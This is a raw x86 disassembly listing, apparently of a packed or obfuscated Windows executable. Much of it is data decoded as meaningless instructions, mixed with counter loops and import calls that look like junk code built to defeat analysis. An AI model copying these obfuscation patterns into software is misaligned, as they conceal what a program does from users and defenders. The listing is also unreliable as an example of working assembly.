  401827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401828:	sbb    edi,ebp
  40182a:	sub    ebp,DWORD PTR [edi]
  40182c:	ss sar ch,0x83
  401830:	mov    edi,ecx
  401832:	mov    ebx,0xfbd8f83
  401837:	lods   eax,DWORD PTR ds:[esi]
  401838:	fisub  WORD PTR [ecx]
  40183a:	in     al,dx
  40183b:	inc    esp
  40183c:	(bad)  
  40183d:	rcr    DWORD PTR [edx],cl
  40183f:	sbb    DWORD PTR [esi-0x26],esi
  401842:	into   
  401843:	cdq    
  401844:	js     0x401845
  401846:	add    al,0xa
  401848:	jo     0x40182b
  40184a:	pop    edi
  40184b:	and    BYTE PTR [esi+0x1a32c6c6],0xf5
  401852:	outs   dx,DWORD PTR ds:[esi]
  401853:	imul   edi,esi,0x5185e6b1
  401859:	cld    
  40185a:	inc    eax
  40185b:	mov    esp,0x505903e9
  401860:	and    eax,0xfa742488
  401865:	adc    eax,ebx
  401867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401868:	inc    edi
  401869:	xor    edx,edi
  40186b:	je     0x401883
  40186d:	aam    0x44
  40186f:	mov    ds:0xd17a9e48,al
  401874:	or     DWORD PTR [edx+eax*2+0x26682312],0xffffffe4
  40187c:	jmp    0x401879
  40187e:	push   0xdd07d88a
  401883:	jecxz  0x4018be
  401885:	test   DWORD PTR [esi+0x1513df6],ebp
  40188b:	(bad)  
  40188d:	mov    ebx,DWORD PTR [edi-0x26e90d72]
  401893:	scas   al,BYTE PTR es:[edi]
  401894:	mov    cl,BYTE PTR [ecx]
  401896:	mov    ah,cl
  401898:	or     edi,DWORD PTR [edx]
  40189a:	or     eax,0xd2dcf6ca
  40189f:	sbb    DWORD PTR [ebx-0x58],eax
  4018a2:	xor    DWORD PTR [eax+0x23f78171],ebp
  4018a8:	xchg   ecx,eax
  4018a9:	loop   0x4018f5
  4018ab:	inc    esi
  4018ac:	push   ebp
  4018ad:	push   0x22
  4018af:	add    DWORD PTR [eax+0x3e],ecx
  4018b2:	push   cs
  4018b3:	push   ebx
  4018b4:	and    cl,BYTE PTR ds:0xfdc30511
  4018ba:	cmp    DWORD PTR [edi-0x5a],0x29
  4018be:	add    eax,edi
  4018c0:	and    DWORD PTR ds:0x433837,0x0
  4018ca:	jmp    0x4018dc
  4018cf:	mov    ebx,DWORD PTR ds:0x433837
  4018d5:	inc    ebx
  4018d6:	mov    DWORD PTR ds:0x433837,ebx
  4018dc:	cmp    DWORD PTR ds:0x433837,0x1c
  4018e3:	jae    0x401910
  4018e9:	cmp    DWORD PTR ds:0x433837,0x23
  4018f0:	jne    0x401901
  4018f6:	push   0x6ff2
  4018fb:	call   DWORD PTR ds:0x41228c
  401901:	jmp    0x4018cf
  401906:	mov    DWORD PTR ds:0x43382b,0x436b
  401910:	mov    DWORD PTR [ebp-0x38],eax
  401913:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40191a:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401921:	or     DWORD PTR ds:0x433777,edx
  401927:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40192e:	add    eax,DWORD PTR ds:0x43376b
  401934:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40193b:	xor    DWORD PTR ds:0x43382f,ecx
  401941:	mov    eax,DWORD PTR [ebp-0x10]
  401944:	xor    ebx,DWORD PTR ds:0x4337f3
  40194a:	xor    eax,esi
  40194c:	add    eax,edi
  40194e:	mov    DWORD PTR [ebp-0xc],eax
  401951:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401958:	sbb    ebx,ebx
  40195a:	mov    BYTE PTR [ebp-0x11],0x67
  40195e:	sub    DWORD PTR ds:0x433767,0x1011
  401968:	mov    eax,DWORD PTR [ebp-0x10]
  40196b:	xor    eax,esi
  40196d:	add    eax,edi
  40196f:	sbb    DWORD PTR ds:0x433733,0x6b1e
  401979:	mov    DWORD PTR [ebp-0xc],eax
  40197c:	mov    eax,DWORD PTR [ebp-0x3c]
  40197f:	xor    eax,esi
  401981:	xor    DWORD PTR ds:0x43376f,0x46ad
  40198b:	add    eax,edi
  40198d:	mov    DWORD PTR [ebp-0x34],eax
  401990:	mov    eax,DWORD PTR [ebp-0x44]
  401993:	mov    DWORD PTR ds:0x433767,0x12
  40199d:	cmp    DWORD PTR ds:0x433767,0x0
  4019a4:	je     0x4019f8
  4019aa:	cmp    DWORD PTR ds:0x433767,0x7
  4019b1:	jne    0x4019c2
  4019b7:	push   0x433867
  4019bc:	call   DWORD PTR ds:0x4121b8
  4019c2:	cmp    DWORD PTR ds:0x433767,0x8
  4019c9:	jne    0x4019dc
  4019cf:	mov    ebx,DWORD PTR ds:0x433767
  4019d5:	dec    ebx
  4019d6:	mov    DWORD PTR ds:0x433767,ebx
  4019dc:	mov    ebx,DWORD PTR ds:0x433767
  4019e2:	dec    ebx
  4019e3:	mov    DWORD PTR ds:0x433767,ebx
  4019e9:	jmp    0x40199d
  4019ee:	and    DWORD PTR ds:0x433713,0x446b
  4019f8:	xor    eax,esi
  4019fa:	add    eax,edi
  4019fc:	not    ebx
  4019fe:	mov    DWORD PTR [ebp-0x30],eax
  401a01:	sub    ebx,DWORD PTR ds:0x4337f7
  401a07:	mov    eax,DWORD PTR [ebp-0x28]
  401a0a:	add    ecx,ecx
  401a0c:	xor    eax,esi
  401a0e:	and    DWORD PTR ds:0x4337eb,0x0
  401a18:	jmp    0x401a2a
  401a1d:	mov    ebx,DWORD PTR ds:0x4337eb
  401a23:	inc    ebx
  401a24:	mov    DWORD PTR ds:0x4337eb,ebx
  401a2a:	cmp    DWORD PTR ds:0x4337eb,0x18
  401a31:	jae    0x401f27
  401a37:	cmp    DWORD PTR ds:0x4337eb,0xa
  401a3e:	jne    0x401a4f
  401a44:	push   0x1a57
  401a49:	call   DWORD PTR ds:0x412350
  401a4f:	cmp    DWORD PTR ds:0x4337eb,0x9
  401a56:	jne    0x401a6b
  401a5c:	xor    ebx,ebx
  401a5e:	xor    ebx,DWORD PTR ds:0x4337eb
  401a64:	inc    ebx
  401a65:	mov    DWORD PTR ds:0x4337eb,ebx
  401a6b:	jmp    0x401a1d
  401a70:	mov    DWORD PTR ds:0x433717,0x13
  401a7a:	cmp    DWORD PTR ds:0x433717,0x0
  401a81:	je     0x401f27
  401a87:	cmp    DWORD PTR ds:0x433717,0xa
  401a8e:	jne    0x401a9f
  401a94:	push   0x764e
  401a99:	call   DWORD PTR ds:0x412290
  401a9f:	cmp    DWORD PTR ds:0x433717,0xb
  401aa6:	jne    0x401abb
  401aac:	xor    ecx,ecx
  401aae:	xor    ecx,DWORD PTR ds:0x433717
  401ab4:	dec    ecx
  401ab5:	mov    DWORD PTR ds:0x433717,ecx
  401abb:	mov    ecx,DWORD PTR ds:0x433717
  401ac1:	dec    ecx
  401ac2:	mov    DWORD PTR ds:0x433717,ecx
  401ac8:	jmp    0x401a7a
  401acd:	and    DWORD PTR ds:0x433777,0x0
  401ad7:	jmp    0x401ae9
  401adc:	mov    ecx,DWORD PTR ds:0x433777
  401ae2:	inc    ecx
  401ae3:	mov    DWORD PTR ds:0x433777,ecx
  401ae9:	cmp    DWORD PTR ds:0x433777,0x1c
  401af0:	jae    0x401f27
  401af6:	cmp    DWORD PTR ds:0x433777,0x1d
  401afd:	jne    0x401b0e
  401b03:	push   0x3c99
  401b08:	call   DWORD PTR ds:0x412294
  401b0e:	jmp    0x401adc
  401b13:	xor    DWORD PTR ds:0x433777,ecx
  401b19:	jmp    0x401f27
  401b1e:	mov    cl,0x40
  401b20:	(bad)  
  401b21:	mul    DWORD PTR es:[ecx+0x73ea5171]
  401b28:	cmp    edx,DWORD PTR [ebx-0x6b]
  401b2b:	mov    ds:0x795c0365,eax
  401b30:	jle    0x401bb0
  401b32:	outs   dx,DWORD PTR ds:[esi]
  401b33:	jge    0x401bb3
  401b35:	jle    0x401b4a
  401b37:	cdq    
  401b38:	dec    ecx
  401b39:	inc    ebp
  401b3a:	xor    bl,ah
  401b3c:	mov    DWORD PTR [edx+ebx*8+0x24eb9241],esi
  401b43:	clc    
  401b44:	inc    edx
  401b45:	mov    ds:0xbd7dcdbf,eax
  401b4a:	fcomi  st,st(2)
  401b4c:	cmp    al,0x8a
  401b4e:	test   BYTE PTR [ecx-0x33947f2e],ch
  401b54:	(bad)  
  401b55:	retf   
  401b56:	fld    QWORD PTR [ecx+0x53]
  401b59:	lds    ebp,FWORD PTR [esi+0xe]
  401b5c:	jp     0x401b82
  401b5e:	xchg   dl,al
  401b60:	ja     0x401b05
  401b62:	cmc    
  401b63:	sub    eax,0x10c4708
  401b68:	mov    bl,0x2b
  401b6a:	clc    
  401b6b:	jge    0x401b42
  401b6d:	cdq    
  401b6e:	das    
  401b6f:	dec    ebx
  401b70:	stc    
  401b71:	addr16 dec eax
  401b73:	cdq    
  401b74:	cmp    BYTE PTR [ebx-0x691a0d],al
  401b7a:	push   esi
  401b7b:	mov    esi,0xc87e5f85
  401b80:	xlat   BYTE PTR ds:[ebx]
  401b81:	int3   
  401b82:	inc    ebx
  401b83:	xchg   esi,eax
  401b84:	repnz pop ss
  401b86:	sahf   
  401b87:	cmp    bh,BYTE PTR [edi+0x2b194cb4]
  401b8d:	out    0xe,eax
  401b8f:	jno    0x401bca
  401b91:	in     eax,dx
  401b92:	sub    al,0x46
  401b94:	in     eax,0x23
  401b96:	and    al,0xf1
  401b98:	cli    
  401b99:	cmp    al,0x8d
  401b9b:	(bad)  
  401b9c:	lahf   
  401b9d:	test   eax,0xf35700ef
  401ba2:	dec    ebx
  401ba3:	arpl   bp,bp
  401ba5:	shl    DWORD PTR [edi+0x21],0xd
  401ba9:	xchg   ebp,eax
  401baa:	mov    bl,BYTE PTR [eax-0x3c]
  401bad:	(bad)  
  401baf:	stos   DWORD PTR es:[edi],eax
  401bb0:	es sub eax,0x391bf9c8
  401bb6:	mov    ebx,0xbd0cc31e
  401bbb:	pop    ebp
  401bbc:	adc    cl,al
  401bbe:	or     al,0xbf
  401bc0:	add    eax,0xaf0605b2
  401bc5:	cmc    
  401bc6:	lea    eax,[edi+0x6e5d6828]
  401bcc:	sbb    BYTE PTR [esi+0x3027f89c],al
  401bd2:	(bad)  
  401bd3:	(bad)  
  401bd4:	iret   
  401bd5:	iret   
  401bd6:	js     0x401b73
  401bd8:	mov    esp,0xa09282d
  401bdd:	retf   0x2e57
  401be0:	sahf   
  401be1:	test   eax,0x62341fdb
  401be6:	ret    
  401be7:	dec    edx
  401be8:	shl    BYTE PTR [edi+0x644d764f],1
  401bee:	retf   0x1add
  401bf1:	add    al,0xd
  401bf3:	mov    esi,0x8fb88374
  401bf8:	addr16 cwde 
  401bfa:	and    eax,DWORD PTR [edi]
  401bfc:	les    ebx,FWORD PTR [ecx]
  401bfe:	mov    esi,0x9ccf35fb
  401c03:	ins    DWORD PTR es:[edi],dx
  401c04:	mov    dh,dl
  401c06:	mov    ebp,0xd6c74e11
  401c0b:	cmp    BYTE PTR [ebx-0x3f3b6b11],dh
  401c11:	mov    edi,DWORD PTR [ecx-0x31]
  401c14:	push   0xffffffec
  401c16:	sub    BYTE PTR [eax-0x1a371099],0x9c
  401c1d:	mov    WORD PTR [ecx],cs
  401c1f:	push   esp
  401c20:	cdq    
  401c21:	xchg   esp,eax
  401c22:	in     eax,dx
  401c23:	sbb    al,0x98
  401c25:	and    ebp,DWORD PTR ds:0xf35c8504
  401c2b:	xor    BYTE PTR ss:[ecx-0xd38de9b],bl
  401c32:	pushf  
  401c33:	xor    dh,BYTE PTR [ecx+0x3f1b7e09]
  401c39:	xchg   ecx,eax
  401c3a:	fidiv  DWORD PTR [ebp-0x64]
  401c3d:	(bad)  
  401c3e:	dec    eax
  401c3f:	cdq    
  401c40:	ins    BYTE PTR es:[edi],dx
  401c41:	pop    ss
  401c42:	xchg   ecx,eax
  401c43:	dec    ebp
  401c44:	xchg   ebp,eax
  401c45:	out    0x88,al
  401c47:	fs std 
  401c49:	call   0x724c6983
  401c4e:	sub    DWORD PTR [eax-0x43],edx
  401c51:	sbb    esi,edx
  401c53:	psubq  mm4,mm7
  401c56:	cld    
  401c57:	adc    BYTE PTR [ecx],bh
  401c59:	icebp  
  401c5a:	mov    ch,0x4f
  401c5c:	and    ebx,DWORD PTR [eax]
  401c5e:	push   es
  401c5f:	push   cs
  401c60:	xchg   edi,edx
  401c62:	js     0x401ca9
  401c64:	(bad)  
  401c65:	dec    esp
  401c66:	mov    DWORD PTR [edi+0x37],ebp
  401c69:	enter  0xf92c,0x84
  401c6d:	sbb    eax,DWORD PTR [edi+0x33]
  401c70:	add    BYTE PTR [ebx-0x25],dh
  401c73:	inc    ebp
  401c74:	sub    DWORD PTR [esi+0x42211df8],esp
  401c7a:	mov    dh,0x8d
  401c7c:	dec    ecx
  401c7d:	(bad)  
  401c7e:	shr    BYTE PTR [ebp+0x2e09980a],1
  401c84:	mov    esp,0x55aa50ae
  401c89:	out    0xb1,eax
  401c8b:	jb     0x401c2d
  401c8d:	pop    edi
  401c8e:	neg    ebx
  401c90:	sbb    edx,DWORD PTR [esi+0x7373014b]
  401c96:	ffree  st(2)
  401c98:	jnp    0x401c88
  401c9a:	jp     0x401c43
  401c9c:	mov    al,0x36
  401c9e:	aas    
  401c9f:	stc    
  401ca0:	hlt    
  401ca1:	in     al,0xd0
  401ca3:	and    DWORD PTR [edx-0x9fe8c5c],esi
  401ca9:	jp     0x401cf2
  401cab:	xchg   ebp,eax
  401cac:	ficomp DWORD PTR [ecx+ebx*4+0x1e]
  401cb0:	fisubr DWORD PTR [ebp+0x37]
  401cb3:	push   0x93c3efc7
  401cb8:	mov    dh,0xa9
  401cbb:	dec    eax
  401cbc:	repnz adc ecx,DWORD PTR [ebx+0x335d7e90]
  401cc3:	adc    bl,dl
  401cc5:	ds dec edx
  401cc7:	jne    0x401c71
  401cc9:	popa   
  401cca:	lds    ecx,FWORD PTR [ebp+0x3a]
  401ccd:	(bad)  
  401cce:	fwait
  401ccf:	repz dec esp
  401cd1:	mov    ch,0x0
  401cd3:	xchg   BYTE PTR [eax+0x76],dh
  401cd6:	add    eax,0x3b241d08
  401cdb:	or     edi,DWORD PTR [edx+0x68]
  401cde:	xchg   ecx,eax
  401cdf:	cmp    edi,esi
  401ce1:	lds    ebx,FWORD PTR [ecx]
  401ce3:	jnp    0x401d0a
  401ce5:	jg     0x401c7f
  401ce7:	imul   ax,WORD PTR [ebp+0x7c6111cc],0x3d9c
  401cf0:	or     DWORD PTR [edi-0x4],ebx
  401cf3:	loop   0x401d39
  401cf5:	inc    ebp
  401cf6:	mov    edx,0xe51ce8f0
  401cfb:	in     al,0xed
  401cfd:	push   ss
  401cfe:	xor    eax,0xddaddb2a
  401d03:	mov    bl,0x78
  401d05:	mov    cs,WORD PTR [ebp-0x19]
  401d08:	or     BYTE PTR [esi],bl
  401d0a:	sub    al,BYTE PTR [ecx-0x2b0c9b2b]
  401d10:	push   ebp
  401d11:	test   al,0x5
  401d13:	add    BYTE PTR [ecx+0x7c1c729e],dl
  401d19:	inc    eax
  401d1a:	cmp    al,BYTE PTR [eax-0x58]
  401d1d:	adc    cl,BYTE PTR ds:0x8c91cb99
  401d23:	inc    edx
  401d24:	je     0x401d30
  401d26:	fldenv [edx+0x6a020bd5]
  401d2c:	push   es
  401d2d:	mov    ch,0x7d
  401d2f:	sar    bl,cl
  401d31:	mov    eax,ds:0x32f06da1
  401d36:	out    0x7d,al
  401d38:	lods   al,BYTE PTR ds:[esi]
  401d39:	enter  0xa8ac,0x38
  401d3d:	mov    esi,0xf6de462a
  401d42:	mov    dh,0xb4
  401d44:	push   0xfffffffb
  401d46:	(bad)  
  401d47:	add    eax,0x5aecd7e4
  401d4c:	arpl   WORD PTR [esi+ebp*4],bx
  401d4f:	dec    esi
  401d50:	mov    WORD PTR [ecx-0x4d],ds
  401d53:	lahf   
  401d54:	pop    ds
  401d55:	retf   
  401d56:	mov    DWORD PTR [ecx+ebx*2-0x1f],eax
  401d5a:	jle    0x401d59
  401d5c:	push   esp
  401d5d:	(bad)  
  401d5e:	xchg   esp,eax
  401d5f:	mov    ds:0xba4b6bc8,eax
  401d64:	mov    WORD PTR [esi-0xb],ds
  401d67:	clc    
  401d68:	(bad)  
  401d69:	push   esi
  401d6a:	jno    0x401d92
  401d6c:	jno    0x401d64
  401d6e:	or     DWORD PTR [di+0x166c],ecx
  401d73:	and    eax,0xba0b24d8
  401d78:	nop
  401d79:	shl    BYTE PTR [esi-0x7e],0xa0
  401d7d:	mov    ah,BYTE PTR [edx+eiz*4]
  401d80:	shl    DWORD PTR [esi+0x56],cl
  401d83:	std    
  401d84:	inc    ebx
  401d85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d86:	push   edx
  401d87:	inc    esp
  401d88:	in     eax,dx
  401d89:	xchg   ebp,eax
  401d8a:	pop    edi
  401d8b:	adc    DWORD PTR [ecx],0xd1242451
  401d91:	dec    edi
  401d92:	loop   0x401da1
  401d94:	imul   BYTE PTR [ebx-0x46]
  401d97:	dec    ebp
  401d98:	test   al,0x79
  401d9a:	iret   
  401d9b:	out    0xb7,al
  401d9d:	mov    esp,0x3ba62475
  401da2:	adc    eax,0x6b9d5457
  401da7:	push   esp
  401da8:	pop    edi
  401da9:	pop    eax
  401daa:	mov    ch,0x78
  401dac:	cs push ebx
  401dae:	push   0x3f
  401db0:	fnstsw ax
  401db2:	add    BYTE PTR [ebp-0x5c],0x63
  401db6:	icebp  
  401db7:	adc    eax,0x1f5ab793
  401dbc:	out    0xfb,eax
  401dbe:	inc    ebp
  401dbf:	pop    ecx
  401dc0:	fnstenv [edi-0x6c34b60d]
  401dc6:	jo     0x401d82
  401dc8:	jno    0x401dba
  401dca:	out    0x33,al
  401dcc:	jno    0x401d93
  401dce:	xchg   eax,eax
  401dd0:	mov    WORD PTR [ebx+0x77],ds
  401dd3:	and    bl,cl
  401dd5:	ret    0xd55f
  401dd8:	sub    BYTE PTR [ecx-0x43],bl
  401ddb:	hlt    
  401ddc:	fcom   QWORD PTR [esi+0x7d653456]
  401de2:	pushf  
  401de3:	xchg   esp,eax
  401de4:	adc    edx,ebx
  401de6:	jp     0x401df8
  401de8:	mov    dl,0x50
  401dea:	stos   DWORD PTR es:[edi],eax
  401deb:	mov    ah,0x4d
  401ded:	frstor [eax]
  401def:	jle    0x401dc2
  401df1:	scas   eax,DWORD PTR es:[edi]
  401df2:	arpl   WORD PTR [eax-0x60],ax
  401df5:	shl    DWORD PTR [edi+0x5e2cec26],0x8c
  401dfc:	call   0x5709f2d9
  401e01:	jl     0x401df7
  401e03:	test   BYTE PTR [esi],bh
  401e05:	xchg   ecx,eax
  401e06:	add    BYTE PTR [edi+0x60],dl
  401e09:	stos   BYTE PTR es:[edi],al
  401e0a:	inc    eax
  401e0b:	loopne 0x401ddf
  401e0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e0e:	or     al,0x97
  401e10:	mov    edx,0x21ca6fbf
  401e15:	inc    ecx
  401e16:	scas   al,BYTE PTR es:[edi]
  401e17:	fst    st(3)
  401e19:	(bad)  
  401e1a:	sbb    esp,DWORD PTR [edx-0x59]
  401e1d:	xchg   DWORD PTR [ecx],edi
  401e1f:	jnp    0x401de6
  401e21:	nop
  401e22:	shr    DWORD PTR [edx+ecx*8+0x36],1
  401e26:	dec    esp
  401e27:	mov    eax,0x65e8dc26
  401e2c:	inc    DWORD PTR [edx+0x3c882ac3]
  401e32:	popf   
  401e33:	mov    dl,BYTE PTR [ebx+0xa]
  401e36:	ins    DWORD PTR es:[edi],dx
  401e37:	in     al,0xfc
  401e39:	xchg   BYTE PTR [edi+edx*4+0x5753258f],al
  401e40:	jo     0x401e12
  401e42:	popa   
  401e43:	inc    esi
  401e44:	or     al,0xbf
  401e46:	cmp    bl,BYTE PTR [ebp+0x25830ff0]
  401e4c:	(bad)  
  401e4d:	inc    ebx
  401e4e:	int3   
  401e4f:	ror    DWORD PTR [eax],1
  401e51:	adc    ah,bh
  401e53:	leave  
  401e54:	test   BYTE PTR [ebx-0x658bcda3],al
  401e5a:	inc    esi
  401e5b:	push   ebp
  401e5c:	or     eax,0x771ddaa4
  401e61:	ret    
  401e62:	or     BYTE PTR [ebp+0x17],bh
  401e65:	leave  
  401e66:	add    edi,ebp
  401e68:	pop    ecx
  401e69:	mov    WORD PTR [edi+0x75c5b8be],?
  401e6f:	inc    ecx
  401e70:	int3   
  401e71:	sub    al,0x49
  401e73:	ret    0xf1ba
  401e76:	jp     0x401ea1
  401e78:	addr16 cdq 
  401e7a:	pushf  
  401e7b:	mov    ecx,eax
  401e7d:	sub    ecx,DWORD PTR [ecx-0x26]
  401e80:	rcl    BYTE PTR [eax-0x33],0x88
  401e84:	cli    
  401e85:	sub    BYTE PTR [esi],bh
  401e87:	aad    0xed
  401e89:	icebp  
  401e8a:	sub    ebx,DWORD PTR [esi+0x114336e2]
  401e90:	mov    dl,0x71
  401e92:	pop    edi
  401e93:	push   0x31692643
  401e98:	xchg   ecx,eax
  401e99:	xchg   BYTE PTR [eax+0x7c325f48],cl
  401e9f:	ret    0x1911
  401ea2:	pushf  
  401ea3:	xchg   edi,eax
  401ea4:	jno    0x401e34
  401ea6:	jge    0x401eff
  401ea8:	mov    ds:0x6bd06e8a,eax
  401ead:	jmp    0xf8f8c01e
  401eb2:	xor    DWORD PTR [esi-0x1f],esi
  401eb5:	mov    ah,0x4b
  401eb7:	push   0x9cf19071
  401ebc:	mov    BYTE PTR [eax-0x6e],dl
  401ebf:	sbb    bl,BYTE PTR [edx]
  401ec1:	clc    
  401ec2:	jbe    0x401ec4
  401ec4:	fwait
  401ec5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ec6:	loop   0x401f26
  401ec8:	push   ebp
  401ec9:	xor    al,0x4f
  401ecb:	mov    WORD PTR [ecx],?
  401ecd:	(bad)  
  401ece:	inc    edi
  401ecf:	sbb    ch,bl
  401ed1:	pop    esp
  401ed2:	sbb    eax,0x91f957c1
  401ed7:	loopne 0x401f30
  401ed9:	and    DWORD PTR [eax-0x6f16ec02],edx
  401edf:	and    BYTE PTR [edi-0x4c],dh
  401ee2:	add    DWORD PTR [ebx-0x4367022e],ebp
  401ee8:	out    dx,eax
  401ee9:	js     0x401ee7
  401eeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401eec:	popf   
  401eed:	in     eax,0x8c
  401eef:	in     al,dx
  401ef0:	xor    al,0x79
  401ef2:	dec    esp
  401ef3:	push   0xb30644b3
  401ef8:	inc    edi
  401ef9:	leave  
  401efa:	dec    edx
  401efb:	or     ecx,ebx
  401efd:	cld    
  401efe:	xlat   BYTE PTR ds:[ebx]
  401eff:	xor    ecx,ecx
  401f01:	jo     0x401e98
  401f03:	es push edx
  401f05:	cmp    DWORD PTR [esi+0x5f9a99cc],0xc5dea37b
  401f0f:	mov    DWORD PTR [eax+0x4efebf9],ecx
  401f15:	rcr    BYTE PTR ds:0xcc0aa6a9,1
  401f1b:	fdivr  QWORD PTR [eax+0x6193610f]
  401f21:	pop    edi
  401f22:	mov    edi,0x269cf21f
  401f27:	add    eax,edi
  401f29:	mov    ebx,DWORD PTR ds:0x43380b
  401f2f:	mov    ecx,DWORD PTR ds:0x433857
  401f35:	sub    ecx,ebx
  401f37:	add    ebx,DWORD PTR [ebx+ecx*1]
  401f3a:	mov    DWORD PTR [ebp-0x2c],eax
  401f3d:	mov    ebx,DWORD PTR ds:0x433847
  401f43:	mov    ebx,DWORD PTR [ebx]
  401f45:	xor    DWORD PTR ds:0x43371b,ebx
  401f4b:	jmp    0x402359
  401f50:	lahf   
  401f51:	in     al,dx
  401f52:	leave  
  401f53:	dec    DWORD PTR [ecx-0x65]
  401f56:	imul   ebp,esp,0xaa49c393
  401f5c:	lds    eax,FWORD PTR [eax]
  401f5e:	test   DWORD PTR [eax+0x4d],ecx
  401f61:	add    eax,0x7d6f7e7e
  401f66:	jle    0x401fe6
  401f68:	adc    al,0x2f
  401f6a:	jne    0x401f15
  401f6c:	jge    0x401f04
  401f6e:	xor    BYTE PTR es:[eax+ebp*2+0x50f18e65],cl
  401f76:	cmp    DWORD PTR [ebx],ecx
  401f78:	dec    ebx
  401f79:	or     al,0x8
  401f7b:	rcr    BYTE PTR [eax+0x52],cl
  401f7e:	push   edx
  401f7f:	fild   QWORD PTR [eax]
  401f81:	mov    bh,0xb1
  401f83:	test   eax,0x5144c3bb
  401f88:	jbe    0x401f3d
  401f8a:	and    eax,DWORD PTR [ebp-0x713661ef]
  401f90:	shl    DWORD PTR [edi-0x34],1
  401f93:	jmp    0x9ba6:0x9c4545d0
  401f9a:	test   al,0x6e
  401f9c:	or     edi,DWORD PTR [edx-0x1]
  401f9f:	outs   dx,BYTE PTR ds:[esi]
  401fa0:	lods   eax,DWORD PTR ds:[esi]
  401fa1:	cmp    esi,DWORD PTR [esi+0x1a]
  401fa4:	fs mov esp,esp
  401fa7:	add    al,0x52
  401fa9:	pop    edi
  401faa:	fwait
  401fab:	mul    BYTE PTR [eax+0xf]
  401fae:	pop    esi
  401faf:	in     eax,0x5e
  401fb1:	loope  0x401f88
  401fb3:	or     BYTE PTR [ebp+0x8eeacb],ah
  401fb9:	popf   
  401fba:	xlat   BYTE PTR ds:[ebx]
  401fbb:	mov    esi,DWORD PTR [edx-0x25492b1c]
  401fc1:	mov    al,ds:0x6e6e89ac
  401fc6:	mov    eax,ds:0x2b5fe27e
  401fcb:	lahf   
  401fcc:	sub    al,0xb0
  401fce:	dec    ecx
  401fcf:	aaa    
  401fd0:	inc    eax
  401fd1:	sub    eax,0x7a623686
  401fd6:	into   
  401fd7:	adc    DWORD PTR [edx],edi
  401fd9:	scas   al,BYTE PTR es:[edi]
  401fda:	mov    cl,0xae
  401fdc:	pop    esp
  401fdd:	inc    ebp
  401fde:	adc    BYTE PTR [esi-0x42cf0730],ch
  401fe4:	dec    eax
  401fe5:	enter  0x3f10,0xb
  401fe9:	jmp    0x3329:0x6e44085a
  401ff0:	call   0x1d7e6eb0
  401ff5:	and    edx,ecx
  401ff7:	ins    BYTE PTR es:[edi],dx
  401ff8:	add    DWORD PTR [eax-0x354c6524],esi
  401ffe:	or     edi,edx
  402000:	pop    ds
  402001:	mov    ebx,0x3471a318
  402006:	mov    WORD PTR [ecx+0x29be1706],ds
  40200c:	xor    edx,ecx
  40200e:	retf   0xebec
  402011:	mov    ch,0xbd
  402013:	cmp    esp,DWORD PTR [esp+ebx*2-0x35]
  402017:	stos   DWORD PTR es:[edi],eax
  402018:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402019:	inc    ebx
  40201a:	ror    BYTE PTR [esi],0x4a
  40201d:	xlat   BYTE PTR ds:[ebx]
  40201e:	mov    ebp,ebx
  402020:	pop    es
  402021:	test   eax,0x6e21007e
  402026:	fwait
  402027:	push   esp
  402028:	cs stc 
  40202a:	sub    eax,0x637141b8
  40202f:	fadd   DWORD PTR [edx-0x4e249d45]
  402035:	mov    bh,0x37
  402037:	and    eax,0xc4a9be24
  40203c:	int3   
  40203d:	cmp    eax,0xd399fe1b
  402042:	stos   BYTE PTR es:[edi],al
  402043:	jecxz  0x401ffd
  402045:	sti    
  402046:	in     al,dx
  402047:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402048:	pusha  
  402049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40204a:	mov    ecx,0xdefc16f9
  40204f:	js     0x401fd6
  402051:	adc    al,0x0
  402053:	out    dx,eax
  402054:	shr    eax,cl
  402056:	das    
  402057:	repnz mov dl,BYTE PTR [ebp+0xd0a01ef]
  40205e:	es sub al,0x6b
  402061:	adc    esp,edi
  402063:	ret    
  402064:	jp     0x402053
  402066:	dec    esp
  402067:	pushf  
  402068:	push   eax
  402069:	cmp    BYTE PTR [esi],ch
  40206b:	sar    cl,cl
  40206d:	and    eax,esp
  40206f:	in     eax,0x87
  402071:	jbe    0x402049
  402073:	pusha  
  402074:	stos   DWORD PTR es:[edi],eax
  402075:	mov    eax,ds:0x99bb3fe
  40207a:	call   0x6871bd47
  40207f:	sub    dh,BYTE PTR [ebp-0x2182fd1]
  402085:	fbstp  TBYTE PTR [edi+0x7c]
  402088:	or     ah,dh
  40208a:	or     al,0x2a
  40208c:	(bad)  
  40208d:	mov    esi,0xf8e7224d
  402092:	imul   ebp,DWORD PTR [edi+0x11],0x0
  402096:	add    DWORD PTR [ebp-0x70],0x69
  40209a:	out    dx,al
  40209b:	xchg   edi,eax
  40209c:	adc    al,dh
  40209e:	outs   dx,DWORD PTR ds:[esi]
  40209f:	lods   al,BYTE PTR ds:[esi]
  4020a0:	dec    ecx
  4020a1:	xchg   esp,edx
  4020a3:	ror    DWORD PTR [ebp+ecx*2+0x1b85db4a],0x2c
  4020ab:	ds jmp 0x40207f
  4020ae:	ds call 0x770cc9cb
  4020b4:	stc    
  4020b5:	pop    ss
  4020b6:	xor    BYTE PTR [ebx-0x53],bh
  4020b9:	lods   al,BYTE PTR ds:[esi]
  4020ba:	mov    DWORD PTR [ecx+0x4e],esp
  4020bd:	pusha  
  4020be:	push   esp
  4020bf:	jbe    0x40211d
  4020c1:	xor    eax,DWORD PTR [ebx]
  4020c3:	xor    al,0xdc
  4020c5:	xor    eax,0xc743591c
  4020ca:	dec    edi
  4020cb:	out    0xc9,eax
  4020cd:	rcr    DWORD PTR [esi+0x3a],cl
  4020d0:	push   0x1e
  4020d2:	popf   
  4020d3:	xor    bh,BYTE PTR [ebp+0x3ae047ed]
  4020d9:	xchg   esp,eax
  4020da:	push   ebx
  4020db:	imul   esi,DWORD PTR [esi-0x72],0x2aafa5b8
